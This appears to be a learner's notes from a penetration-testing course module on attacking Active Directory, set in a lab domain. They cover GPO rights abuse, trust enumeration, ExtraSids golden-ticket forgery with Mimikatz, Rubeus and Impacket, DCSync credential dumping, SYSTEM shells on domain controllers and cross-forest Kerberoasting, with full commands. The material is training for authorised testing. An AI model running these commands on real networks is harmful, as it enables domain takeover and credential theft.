			AceType               : AccessAllowed
			AceFlags              : ObjectInherit, ContainerInherit
			IsInherited           : False
			InheritanceFlags      : ContainerInherit, ObjectInherit
			PropagationFlags      : None
			AuditFlags            : None

	> Here we can see that the Domain Users group has various permissions over a GPO, such as WriteProperty and WriteDacl, which we could leverage to give ourselves full control over the GPO and pull off any number of attacks that would be pushed down to any users and computers in OUs that the GPO is applied to. We can use the GPO GUID combined with Get-GPO to see the display name of the GPO.
	> Converting GPO GUID to Name
		PS C:\htb Get-GPO -Guid 7CA9C789-14CE-46E3-A722-83F4097AF532

			DisplayName      : Disconnect Idle RDP
			DomainName       : INLANEFREIGHT.LOCAL
			Owner            : INLANEFREIGHT\Domain Admins
			Id               : 7ca9c789-14ce-46e3-a722-83f4097af532
			GpoStatus        : AllSettingsEnabled
			Description      :
			CreationTime     : 10/28/2021 3:34:07 PM
			ModificationTime : 4/5/2022 6:54:25 PM
			UserVersion      : AD Version: 0, SysVol Version: 0
			ComputerVersion  : AD Version: 0, SysVol Version: 0
			WmiFilter        :

	> Checking in BloodHound, we can see that the Domain Users group has several rights over the Disconnect Idle RDP GPO, which could be leveraged for full control of the object. => (https://academy.hackthebox.com/storage/modules/143/gporights.png)
	> If we select the GPO in BloodHound and scroll down to Affected Objects on the Node Info tab, we can see that this GPO is applied to one OU, which contains four computer objects.
	> We could use a tool such as SharpGPOAbuse(https://github.com/FSecureLABS/SharpGPOAbuse) to take advantage of this GPO misconfiguration by performing actions such as adding a user that we control to the local admins group on one of the affected hosts, creating an immediate scheduled task on one of the hosts to give us a reverse shell, or configure a malicious computer startup script to provide us with a reverse shell or similar. When using a tool like this, we need to be careful because commands can be run that affect every computer within the OU that the GPO is linked to. If we found an editable GPO that applies to an OU with 1,000 computers, we would not want to make the mistake of adding ourselves as a local admin to that many hosts. Some of the attack options available with this tool allow us to specify a target user or host. The hosts shown in the above image are not exploitable, and GPO attacks will be covered in-depth in a later module.

* Onwards
	> We have seen various misconfigurations that we may run into during an assessment, and there are many more that will be covered in more advanced Active Directory modules. It is worth familiarizing ourselves with as many attacks as possible, so we recommend doing some research on topics such as:

    		- Active Directory Certificate Services (AD CS) attacks
    		- Kerberos Constrained Delegation
    		- Kerberos Unconstrained Delegation
    		- Kerberos Resource-Based Constrained Delegation (RBCD)

-=-=-=-=-=
[+] Domain Trusts Primer 

* Scenario
	> Many large organizations will acquire new companies over time and bring them into the fold. One way this is done for ease of use is to establish a trust relationship with the new domain. In doing so, you can avoid migrating all the established objects, making integration much quicker. This trust can also introduce weaknesses into the customer's environment if they are not careful. A subdomain with an exploitable flaw or vulnerability can provide us with a quick route into the target domain. Companies may also establish trusts with other companies (such as an MSP), a customer, or other business units of the same company (such as a division of the company in another geographical region). Let's explore domain trusts more and how we can abuse built-in functionality during our assessments.

* Domain Trusts Overview
	> A trust(https://social.technet.microsoft.com/wiki/contents/articles/50969.active-directory-forest-trust-attention-points.aspx) is used to establish forest-forest or domain-domain (intra-domain) authentication, which allows users to access resources in (or perform administrative tasks) another domain, outside of the main domain where their account resides. A trust creates a link between the authentication systems of two domains and may allow either one-way or two-way (bidirectional) communication. An organization can create various types of trusts:
		- Parent-child: Two or more domains within the same forest. The child domain has a two-way transitive trust with the parent domain, meaning that users in the child domain corp.inlanefreight.local could authenticate into the parent domain inlanefreight.local, and vice-versa.
    		- Cross-link: A trust between child domains to speed up authentication.
    		- External: A non-transitive trust between two separate domains in separate forests which are not already joined by a forest trust. This type of trust utilizes SID(https://www.serverbrain.org/active-directory-2008/sid-history-and-sid-filtering.html) filtering or filters out authentication requests (by SID) not from the trusted domain.
    		- Tree-root: A two-way transitive trust between a forest root domain and a new tree root domain. They are created by design when you set up a new tree root domain within a forest.
    		- Forest: A transitive trust between two forest root domains.
    		- ESAE(https://docs.microsoft.com/en-us/security/compass/esae-retirement): A bastion forest used to manage Active Directory.

	> When establishing a trust, certain elements can be modified depending on the business case.
	> Trusts can be transitive or non-transitive.
    		- A transitive trust means that trust is extended to objects that the child domain trusts. For example, let's say we have three domains. In a transitive relationship, if Domain A has a trust with Domain B, and Domain B has a transitive trust with Domain C, then Domain A will automatically trust Domain C.
    		- In a non-transitive trust, the child domain itself is the only one trusted.
	> (https://academy.hackthebox.com/storage/modules/143/transitive-trusts.png)
	> Adapted from here => (https://zindagitech.com/wp-content/uploads/2021/09/Picture2-Deepak-4.png.webp)

	> Trust Table Side By Side
		- Transitive 									Non-Transitive
		   Shared, 1 to many 								Direct trust
		   The trust is shared with anyone in the forest 				Not extended to next level child domains
		   Forest, tree-root, parent-child, and cross-link trusts are transitive 	Typical for external or custom trust setups

	> An easy comparison to make can be package delivery to your house. For a transitive trust, you have extended the permission to anyone in your household (forest) to accept a package on your behalf. For a non-transitive trust, you have given strict orders with the package that no one other than the delivery service and you can handle the package, and only you can sign for it.
	> Trusts can be set up in two directions: one-way or two-way (bidirectional).
    		- One-way trust: Users in a trusted domain can access resources in a trusting domain, not vice-versa.
    		- Bidirectional trust: Users from both trusting domains can access resources in the other domain. For example, in a bidirectional trust between INLANEFREIGHT.LOCAL and FREIGHTLOGISTICS.LOCAL, users in INLANEFREIGHT.LOCAL would be able to access resources in FREIGHTLOGISTICS.LOCAL, and vice-versa.

	> Domain trusts are often set up incorrectly and can provide us with critical unintended attack paths. Also, trusts set up for ease of use may not be reviewed later for potential security implications if security is not considered before establishing the trust relationship. A Merger & Acquisition (M&A) between two companies can result in bidirectional trusts with acquired companies, which can unknowingly introduce risk into the acquiring company’s environment if the security posture of the acquired company is unknown and untested. If someone wanted to target your organization, they could also look at the other company you acquired for a potentially softer target to attack, allowing them to get into your organization indirectly. It is not uncommon to be able to perform an attack such as Kerberoasting against a domain outside the principal domain and obtain a user that has administrative access within the principal domain. I have performed many penetration tests where this was the case: I was unable to find a foothold in the principal domain, but was able to find a flaw in a trusted domain which, in turn, gave me a foothold, or even full admin rights in the principal domain. This type of "end-around" attack could be prevented if security is considered as paramount before establishing any kind of domain trust. As we examine trust relationships, keep these thoughts in mind for reporting. Often, we will find that the larger organization is unaware that a trust relationship exists with one or more domains.

	> Below is a graphical representation of the various trust types.
		(https://academy.hackthebox.com/storage/modules/143/trusts-diagram.png)

* Enumerating Trust Relationships
	> We can use the Get-ADTrust cmdlet to enumerate domain trust relationships. This is especially helpful if we are limited to just using built-in tools.
	> Using Get-ADTrust
		PS C:\htb> Import-Module activedirectory
		PS C:\htb> Get-ADTrust -Filter *
			Direction               : BiDirectional
			DisallowTransivity      : False
			DistinguishedName       : CN=LOGISTICS.INLANEFREIGHT.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
			ForestTransitive        : False
			IntraForest             : True
			IsTreeParent            : False
			IsTreeRoot              : False
			Name                    : LOGISTICS.INLANEFREIGHT.LOCAL
			ObjectClass             : trustedDomain
			ObjectGUID              : f48a1169-2e58-42c1-ba32-a6ccb10057ec
			SelectiveAuthentication : False
			SIDFilteringForestAware : False
			SIDFilteringQuarantined : False
			Source                  : DC=INLANEFREIGHT,DC=LOCAL
			Target                  : LOGISTICS.INLANEFREIGHT.LOCAL
			TGTDelegation           : False
			TrustAttributes         : 32
			TrustedPolicy           :
			TrustingPolicy          :
			TrustType               : Uplevel
			UplevelOnly             : False
			UsesAESKeys             : False
			UsesRC4Encryption       : False
			
			Direction               : BiDirectional
			DisallowTransivity      : False
			DistinguishedName       : CN=FREIGHTLOGISTICS.LOCAL,CN=System,DC=INLANEFREIGHT,DC=LOCAL
			ForestTransitive        : True
			IntraForest             : False
			IsTreeParent            : False
			IsTreeRoot              : False
			Name                    : FREIGHTLOGISTICS.LOCAL
			ObjectClass             : trustedDomain
			ObjectGUID              : 1597717f-89b7-49b8-9cd9-0801d52475ca
			SelectiveAuthentication : False
			SIDFilteringForestAware : False
			SIDFilteringQuarantined : False
			Source                  : DC=INLANEFREIGHT,DC=LOCAL
			Target                  : FREIGHTLOGISTICS.LOCAL
			TGTDelegation           : False
			TrustAttributes         : 8
			TrustedPolicy           :
			TrustingPolicy          :
			TrustType               : Uplevel
			UplevelOnly             : False
			UsesAESKeys             : False
			UsesRC4Encryption       : False


	> The above output shows that our current domain INLANEFREIGHT.LOCAL has two domain trusts. The first is with LOGISTICS.INLANEFREIGHT.LOCAL, and the IntraForest property shows that this is a child domain, and we are currently positioned in the root domain of the forest. The second trust is with the domain FREIGHTLOGISTICS.LOCAL, and the ForestTransitive property is set to True, which means that this is a forest trust or external trust. We can see that both trusts are set up to be bidirectional, meaning that users can authenticate back and forth across both trusts. This is important to note down during an assessment. If we cannot authenticate across a trust, we cannot perform any enumeration or attacks across the trust.
	> Aside from using built-in AD tools such as the Active Directory PowerShell module, both PowerView and BloodHound can be utilized to enumerate trust relationships, the type of trusts established, and the authentication flow. After importing PowerView, we can use the Get-DomainTrust function to enumerate what trusts exist, if any.
	> Checking for Existing Trusts using Get-DomainTrust
		PS C:\htb> Get-DomainTrust 
			SourceName      : INLANEFREIGHT.LOCAL
			TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
			TrustType       : WINDOWS_ACTIVE_DIRECTORY
			TrustAttributes : WITHIN_FOREST
			TrustDirection  : Bidirectional
			WhenCreated     : 11/1/2021 6:20:22 PM
			WhenChanged     : 2/26/2022 11:55:55 PM
			
			SourceName      : INLANEFREIGHT.LOCAL
			TargetName      : FREIGHTLOGISTICS.LOCAL
			TrustType       : WINDOWS_ACTIVE_DIRECTORY
			TrustAttributes : FOREST_TRANSITIVE
			TrustDirection  : Bidirectional
			WhenCreated     : 11/1/2021 8:07:09 PM
			WhenChanged     : 2/27/2022 12:02:39 AM

	> PowerView can be used to perform a domain trust mapping and provide information such as the type of trust (parent/child, external, forest) and the direction of the trust (one-way or bidirectional). This information is beneficial once a foothold is obtained, and we plan to compromise the environment further.
	> Using Get-DomainTrustMapping
		PS C:\htb> Get-DomainTrustMapping
			SourceName      : INLANEFREIGHT.LOCAL
			TargetName      : LOGISTICS.INLANEFREIGHT.LOCAL
			TrustType       : WINDOWS_ACTIVE_DIRECTORY
			TrustDirection  : Bidirectional
			WhenCreated     : 11/1/2021 6:20:22 PM
			WhenChanged     : 2/26/2022 11:55:55 PM
			
			SourceName      : INLANEFREIGHT.LOCAL
			TargetName      : FREIGHTLOGISTICS.LOCAL
			TrustType       : WINDOWS_ACTIVE_DIRECTORY
			TrustAttributes : FOREST_TRANSITIVE
			TrustDirection  : Bidirectional
			WhenCreated     : 11/1/2021 8:07:09 PM
			WhenChanged     : 2/27/2022 12:02:39 AM
			
			SourceName      : FREIGHTLOGISTICS.LOCAL
			TargetName      : INLANEFREIGHT.LOCAL
			TrustType       : WINDOWS_ACTIVE_DIRECTORY
			TrustAttributes : FOREST_TRANSITIVE
			TrustDirection  : Bidirectional
			WhenCreated     : 11/1/2021 8:07:08 PM
			WhenChanged     : 2/27/2022 12:02:41 AM
			
			SourceName      : LOGISTICS.INLANEFREIGHT.LOCAL
			TargetName      : INLANEFREIGHT.LOCAL
			TrustType       : WINDOWS_ACTIVE_DIRECTORY
			TrustAttributes : WITHIN_FOREST
			TrustDirection  : Bidirectional
			WhenCreated     : 11/1/2021 6:20:22 PM
			WhenChanged     : 2/26/2022 11:55:55 PM

	> From here, we could begin performing enumeration across the trusts. For example, we could look at all users in the child domain:
	> Checking Users in the Child Domain using Get-DomainUser
		PS C:\htb> Get-DomainUser -Domain LOGISTICS.INLANEFREIGHT.LOCAL | select SamAccountName

	> Another tool we can use to get Domain Trust is netdom. The netdom query sub-command of the netdom command-line tool in Windows can retrieve information about the domain, including a list of workstations, servers, and domain trusts.
	> Using netdom to query domain trust
		C:\htb> netdom query /domain:inlanefreight.local trust
	> Using netdom to query domain controllers
		C:\htb> netdom query /domain:inlanefreight.local dc
	> Using netdom to query workstations and servers
		C:\htb> netdom query /domain:inlanefreight.local workstation

	> We can also use BloodHound to visualize these trust relationships by using the Map Domain Trusts pre-built query. Here we can easily see that two bidirectional trusts exist.

* Onwards

	> In the following few sections, we will cover common attacks that we can perform against child --> parent domain trusts and across bidirectional forest trusts. These types of attacks should not be overlooked, but we should always check with our client to ensure that any trusts we uncover during our enumeration are in scope for the assessment and we are not going outside the Rules of Engagement.

-=-=
[+] Attacking Domain Trusts - Child -> Parent Trusts - from Windows

* SID History Primer
	> The sidHistory(https://docs.microsoft.com/en-us/windows/win32/adschema/a-sidhistory) attribute is used in migration scenarios. If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.
	> SID history is intended to work across domains, but can work in the same domain. Using Mimikatz, an attacker can perform SID history injection and add an administrator account to the SID History attribute of an account they control. When logging in with this account, all of the SIDs associated with the account are added to the user's token.
	> This token is used to determine what resources the account can access. If the SID of a Domain Admin account is added to the SID History attribute of this account, then this account will be able to perform DCSync and create a Golden Ticket or a Kerberos ticket-granting ticket (TGT), which will allow for us to authenticate as any account in the domain of our choosing for further persistence.

* ExtraSids Attack - Mimikatz
	> This attack allows for the compromise of a parent domain once the child domain has been compromised. Within the same AD forest, the sidHistory property is respected due to a lack of SID Filtering protection. SID Filtering is a protection put in place to filter out authentication requests from a domain in another forest across a trust. Therefore, if a user in a child domain that has their sidHistory set to the Enterprise Admins group (which only exists in the parent domain), they are treated as a member of this group, which allows for administrative access to the entire forest. In other words, we are creating a Golden Ticket from the compromised child domain to compromise the parent domain. In this case, we will leverage the SIDHistory to grant an account (or non-existent account) Enterprise Admin rights by modifying this attribute to contain the SID for the Enterprise Admins group, which will give us full access to the parent domain without actually being part of the group.
	> To perform this attack after compromising a child domain, we need the following:
    		- The KRBTGT hash for the child domain
    		- The SID for the child domain
    		- The name of a target user in the child domain (does not need to exist!)
    		- The FQDN of the child domain.
    		- The SID of the Enterprise Admins group of the root domain.
    		- With this data collected, the attack can be performed with Mimikatz.
	> Now we can gather each piece of data required to perform the ExtraSids attack. First, we need to obtain the NT hash for the KRBTGT account, which is a service account for the Key Distribution Center (KDC) in Active Directory. The account KRB (Kerberos) TGT (Ticket Granting Ticket) is used to encrypt/sign all Kerberos tickets granted within a given domain. Domain controllers use the account's password to decrypt and validate Kerberos tickets. The KRBTGT account can be used to create Kerberos TGT tickets that can be used to request TGS tickets for any service on any host in the domain. This is also known as the Golden Ticket attack and is a well-known persistence mechanism for attackers in Active Directory environments. The only way to invalidate a Golden Ticket is to change the password of the KRBTGT account, which should be done periodically and definitely after a penetration test assessment where full domain compromise is reached.
	> Since we have compromised the child domain, we can log in as a Domain Admin or similar and perform the DCSync attack to obtain the NT hash for the KRBTGT account.
	> Obtaining the KRBTGT Account's NT Hash using Mimikatz
		PS C:\htb>  mimikatz # lsadump::dcsync /user:LOGISTICS\krbtgt

	> We can use the PowerView Get-DomainSID function to get the SID for the child domain, but this is also visible in the Mimikatz output above.
	> Using Get-DomainSID
		PS C:\htb> Get-DomainSID

	> Next, we can use Get-DomainGroup from PowerView to obtain the SID for the Enterprise Admins group in the parent domain. We could also do this with the Get-ADGroup cmdlet with a command such as Get-ADGroup -Identity "Enterprise Admins" -Server "INLANEFREIGHT.LOCAL".
	> Obtaining Enterprise Admins Group's SID using Get-DomainGroup
		PS C:\htb> Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity "Enterprise Admins" | select distinguishedname,objectsid

	> At this point, we have gathered the following data points:
    		- The KRBTGT hash for the child domain: 9d765b482771505cbe97411065964d5f
    		- The SID for the child domain: S-1-5-21-2806153819-209893948-922872689
    		- The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user: hacker
    		- The FQDN of the child domain: LOGISTICS.INLANEFREIGHT.LOCAL
    		- The SID of the Enterprise Admins group of the root domain: S-1-5-21-3842939050-3880317879-2865463114-519

	> Using Mimikatz and the data listed above, we can create a Golden Ticket to access all resources within the parent domain.
	> Creating a Golden Ticket with Mimikatz
		PS C:\htb> mimikatz.exe
		mimikatz # kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt

	> We can confirm that the Kerberos ticket for the non-existent hacker user is residing in memory.
	> Confirming a Kerberos Ticket is in Memory Using klist
		PS C:\htb> klist

	> From here, it is possible to access any resources within the parent domain, and we could compromise the parent domain in several ways.
	> Listing the Entire C: Drive of the Domain Controller
		PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$

* ExtraSids Attack - Rubeus
	> We can also perform this attack using Rubeus. First, again, we'll confirm that we cannot access the parent domain Domain Controller's file system.
	> Using ls to Confirm No Access Before Running Rubeus
		PS C:\htb> ls \\academy-ea-dc01.inlanefreight.local\c$
		ls : Access is denied

	> Next, we will formulate our Rubeus command using the data we retrieved above. The /rc4 flag is the NT hash for the KRBTGT account. The /sids flag will tell Rubeus to create our Golden Ticket giving us the same rights as members of the Enterprise Admins group in the parent domain.
	> Creating a Golden Ticket using Rubeus
		PS C:\htb>  .\Rubeus.exe golden /rc4:9d765b482771505cbe97411065964d5f /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689  /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /user:hacker /ptt

	> Once again, we can check that the ticket is in memory using the klist command.
	> Confirming the Ticket is in Memory Using klist
		PS C:\htb> klist
	> Finally, we can test this access by performing a DCSync attack against the parent domain, targeting the lab_adm Domain Admin user.
	> Performing a DCSync Attack
		PS C:\Tools\mimikatz\x64> .\mimikatz.exe
		mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
* Next Steps
	> Now that we've walked through child --> parent domain compromise from a Windows attack box, we'll cover a few ways to achieve the same if we are constrained to a Linux attack host.

-=-=
[+] Attacking Domain Trusts - Child -> Parent Trusts - from Linux
	> We can also perform the attack shown in the previous section from a Linux attack host. To do so, we'll still need to gather the same bits of information:
    		- The KRBTGT hash for the child domain
    		- The SID for the child domain
    		- The name of a target user in the child domain (does not need to exist!)
    		- The FQDN of the child domain
    		- The SID of the Enterprise Admins group of the root domain

	> Once we have complete control of the child domain, LOGISTICS.INLANEFREIGHT.LOCAL, we can use secretsdump.py to DCSync and grab the NTLM hash for the KRBTGT account.
	> Performing DCSync with secretsdump.py
		m1l0js@htb[/htb]$ secretsdump.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 -just-dc-user LOGISTICS/krbtgt

	> Next, we can use lookupsid.py from the Impacket toolkit to perform SID brute forcing to find the SID of the child domain. In this command, whatever we specify for the IP address (the IP of the domain controller in the child domain) will become the target domain for a SID lookup. The tool will give us back the SID for the domain and the RIDs for each user and group that could be used to create their SID in the format DOMAIN_SID-RID. For example, from the output below, we can see that the SID of the lab_adm user would be S-1-5-21-2806153819-209893948-922872689-1001.
	> Performing SID Brute Forcing using lookupsid.py
		m1l0js@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 

	> We can filter out the noise by piping the command output to grep and looking for just the domain SID.
	> Looking for the Domain SID
		m1l0js@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.240 | grep "Domain SID"

	> Next, we can rerun the command, targeting the INLANEFREIGHT Domain Controller (DC01) at 172.16.5.5 and grab the domain SID S-1-5-21-3842939050-3880317879-2865463114 and attach the RID of the Enterprise Admins group. Here is a handy list of well-known SIDs. => (https://adsecurity.org/?p=1001)
	> Grabbing the Domain SID & Attaching to Enterprise Admin's RID
		m1l0js@htb[/htb]$ lookupsid.py logistics.inlanefreight.local/htb-student_adm@172.16.5.5 | grep -B12 "Enterprise Admins"

	> We have gathered the following data points to construct the command for our attack. Once again, we will use the non-existent user hacker to forge our Golden Ticket.
    		- The KRBTGT hash for the child domain: 9d765b482771505cbe97411065964d5f
    		- The SID for the child domain: S-1-5-21-2806153819-209893948-922872689
    		- The name of a target user in the child domain (does not need to exist!): hacker
    		- The FQDN of the child domain: LOGISTICS.INLANEFREIGHT.LOCAL
    		- The SID of the Enterprise Admins group of the root domain: S-1-5-21-3842939050-3880317879-2865463114-519

	> Next, we can use ticketer.py from the Impacket toolkit to construct a Golden Ticket. This ticket will be valid to access resources in the child domain (specified by -domain-sid) and the parent domain (specified by -extra-sid).
	> Constructing a Golden Ticket using ticketer.py
		m1l0js@htb[/htb]$ ticketer.py -nthash 9d765b482771505cbe97411065964d5f -domain LOGISTICS.INLANEFREIGHT.LOCAL -domain-sid S-1-5-21-2806153819-209893948-922872689 -extra-sid S-1-5-21-3842939050-3880317879-2865463114-519 hacker

	> The ticket will be saved down to our system as a credential cache (ccache => https://web.mit.edu/kerberos/krb5-1.12/doc/basic/ccache_def.html) file, which is a file used to hold Kerberos credentials. Setting the KRB5CCNAME environment variable tells the system to use this file for Kerberos authentication attempts.
	> Setting the KRB5CCNAME Environment Variable
		m1l0js@htb[/htb]$ export KRB5CCNAME=hacker.ccache 

	> We can check if we can successfully authenticate to the parent domain's Domain Controller using Impacket's version of Psexec. If successful, we will be dropped into a SYSTEM shell on the target Domain Controller.
	> Getting a SYSTEM shell using Impacket's psexec.py
		m1l0js@htb[/htb]$ psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/hacker@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5

	> Impacket also has the tool raiseChild.py, which will automate escalating from child to parent domain. We need to specify the target domain controller and credentials for an administrative user in the child domain; the script will do the rest. If we walk through the output, we see that it starts by listing out the child and parent domain's fully qualified domain names (FQDN). It then:
    		- Obtains the SID for the Enterprise Admins group of the parent domain
    		- Retrieves the hash for the KRBTGT account in the child domain
    		- Creates a Golden Ticket
    		- Logs into the parent domain
    		- Retrieves credentials for the Administrator account in the parent domain

	> Finally, if the target-exec switch is specified, it authenticates to the parent domain's Domain Controller via Psexec.
	> Performing the Attack with raiseChild.py
		m1l0js@htb[/htb]$ raiseChild.py -target-exec 172.16.5.5 LOGISTICS.INLANEFREIGHT.LOCAL/htb-student_adm


	> The script lists out the workflow and process in a comment as follows:

	> Though tools such as raiseChild.py can be handy and save us time, it is essential to understand the process and be able to perform the more manual version by gathering all of the required data points. In this case, if the tool fails, we are more likely to understand why and be able to troubleshoot what is missing, which we would not be able to if blindly running this tool. In a client production environment, we should always be careful when running any sort of "autopwn" script like this, and always remain cautious and construct commands manually when possible. Other tools exist which can take in data from a tool such as BloodHound, identify attack paths, and perform an "autopwn" function that can attempt to perform each action in an attack chain to elevate us to Domain Admin (such as a long ACL attack path). I would recommend avoiding tools such as these and work with tools that you understand fully, and will also give you the greatest degree of control throughout the process.
	> We don't want to tell the client that something broke because we used an "autopwn" script!

* More Fun
	> In the next section, we will briefly discuss some techniques that can be used for cross-forest trust abuse when we find ourselves in an environment with a bidirectional forest trust (meaning we can authenticate into another forest). We will not cover all possible cross-forest trust attacks, as those will be covered in great detail in later modules.

-=-=-=
[+] Attacking Domain Trusts - Cross-Forest Trust Abuse - from Windows

* Cross-Forest Kerberoasting

	> Kerberos attacks such as Kerberoasting and ASREPRoasting can be performed across trusts, depending on the trust direction. In a situation where you are positioned in a domain with either an inbound or bidirectional domain/forest trust, you can likely perform various attacks to gain a foothold. Sometimes you cannot escalate privileges in your current domain, but instead can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has Domain/Enterprise Admin privileges in both domains.
	> We can utilize PowerView to enumerate accounts in a target domain that have SPNs associated with them.
	> Enumerating Accounts for Associated SPNs Using Get-DomainUser
		PS C:\htb> Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName

	> We see that there is one account with an SPN in the target domain. A quick check shows that this account is a member of the Domain Admins group in the target domain, so if we can Kerberoast it and crack the hash offline, we'd have full admin rights to the target domain.
	> Enumerating the mssqlsvc Account
		PS C:\htb> Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc |select samaccountname,memberof

	> Let's perform a Kerberoasting attack across the trust using Rubeus. We run the tool as we did in the Kerberoasting section, but we include the /domain: flag and specify the target domain.
	> Performing a Kerberoasting Attacking with Rubeus Using /domain Flag
		PS C:\htb> .\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap

	> We could then run the hash through Hashcat. If it cracks, we've now quickly expanded our access to fully control two domains by leveraging a pretty standard attack and abusing the authentication direction and setup of the bidirectional forest trust.

* Admin Password Re-Use & Group Membership

	> From time to time, we'll run into a situation where there is a bidirectional forest trust managed by admins from the same company. If we can take over Domain A and obtain cleartext passwords or NT hashes for either the built-in Administrator account or an account that is part of the Enterprise Admins or Domain Admins group in Domain A and Domain B has a highly privileged account with the same name. It is worth checking for password reuse across the two forests in this situation. I occasionally ran into issues where, for example, Domain A would have a user named adm_bob.smith in the Domain Admins group, and Domain B had a user named bsmith_admin. Sometimes, the user would be using the same password in the two domains, and owning Domain A instantly gave me full admin rights to Domain B.
	> We may also see users or admins from Domain A as members of a group in Domain B. Only Domain Local Groups allow security principals from outside its forest. We may see a Domain Admin or Enterprise Admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectional forest trust relationship. If we can take over this admin user in Domain A, we would gain full administrative access to Domain B based on group membership.
	> We can use the PowerView function Get-DomainForeignGroupMember to enumerate groups with users that do not belong to the domain, also known as foreign group membership. Let's try this against the FREIGHTLOGISTICS.LOCAL domain with which we have an external bidirectional forest trust.
	> Using Get-DomainForeignGroupMember
		PS C:\htb> Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL
			GroupDomain             : FREIGHTLOGISTICS.LOCAL
			GroupName               : Administrators
			GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL
			MemberDomain            : FREIGHTLOGISTICS.LOCAL
			MemberName              : S-1-5-21-3842939050-3880317879-2865463114-500
			MemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS
			                          TICS,DC=LOCAL
			
		PS C:\htb> Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500
			INLANEFREIGHT\administrator

	> The above command output shows that the built-in Administrators group in FREIGHTLOGISTICS.LOCAL has the built-in Administrator account for the INLANEFREIGHT.LOCAL domain as a member. We can verify this access using the Enter-PSSession cmdlet to connect over WinRM.
	> Accessing DC03 Using Enter-PSSession
		PS C:\htb> Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\administrator
			[ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL]: PS C:\Users\administrator.INLANEFREIGHT\Documents> whoami
			inlanefreight\administrator
	> From the command output above, we can see that we successfully authenticated to the Domain Controller in the FREIGHTLOGISTICS.LOCAL domain using the Administrator account from the INLANEFREIGHT.LOCAL domain across the bidirectional forest trust. This can be a quick win after taking control of a domain and is always worth checking for if a bidirectional forest trust situation is present during an assessment and the second forest is in-scope.

* SID History Abuse - Cross Forest

	> SID History can also be abused across a forest trust. If a user is migrated from one forest to another and SID Filtering is not enabled, it becomes possible to add a SID from the other forest, and this SID will be added to the user's token when authenticating across the trust. If the SID of an account with administrative privileges in Forest A is added to the SID history attribute of an account in Forest B, assuming they can authenticate across the forest, then this account will have administrative privileges when accessing resources in the partner forest. In the below diagram, we can see an example of the jjones user being migrated from the INLANEFREIGHT.LOCAL domain to the CORP.LOCAL domain in a different forest. If SID filtering is not enabled when this migration is made and the user has administrative privileges (or any type of interesting rights such as ACE entries, access to shares, etc.) in the INLANEFREIGHT.LOCAL domain, then they will retain their administrative rights/access in INLANEFREIGHT.LOCAL while being a member of the new domain, CORP.LOCAL in the second forest. => (https://academy.hackthebox.com/storage/modules/143/sid-history.png)
	> This attack will be covered in-depth in a later module focusing more heavily on attacking AD trusts.

-=-=-=-=-=
[+] Attacking Domain Trusts - Cross-Forest Trust Abuse - from Linux

	> As we saw in the previous section, it is often possible to Kerberoast across a forest trust. If this is possible in the environment we are assessing, we can perform this with GetUserSPNs.py from our Linux attack host. To do this, we need credentials for a user that can authenticate into the other domain and specify the -target-domain flag in our command. Performing this against the FREIGHTLOGISTICS.LOCAL domain, we see one SPN entry for the mssqlsvc account.
	> Cross-Forest Kerberoasting
	> Using GetUserSPNs.py
		m1l0js@htb[/htb]$ GetUserSPNs.py -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley

	> Rerunning the command with the -request flag added gives us the TGS ticket. We could also add -outputfile <OUTPUT FILE> to output directly into a file that we could then turn around and run Hashcat against.
	> Using the -request Flag
		m1l0js@htb[/htb]$ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCAL/wley  

	> We could then attempt to crack this offline using Hashcat with mode 13100. If successful, we'd be able to authenticate into the FREIGHTLOGISTICS.LOCAL domain as a Domain Admin. If we are successful with this type of attack during a real-world assessment, it would also be worth checking to see if this account exists in our current domain and if it suffers from password re-use. This could be a quick win for us if we have not yet been able to escalate in our current domain. Even if we already have control over the current domain, it would be worth adding a finding to our report if we do find password re-use across similarly named accounts in different domains.
	> Suppose we can Kerberoast across a trust and have run out of options in the current domain. In that case, it could also be worth attempting a single password spray with the cracked password, as there is a possibility that it could be used for other service accounts if the same admins are in charge of both domains. Here, we have yet another example of iterative testing and leaving no stone unturned.
* Hunting Foreign Group Membership with Bloodhound-python
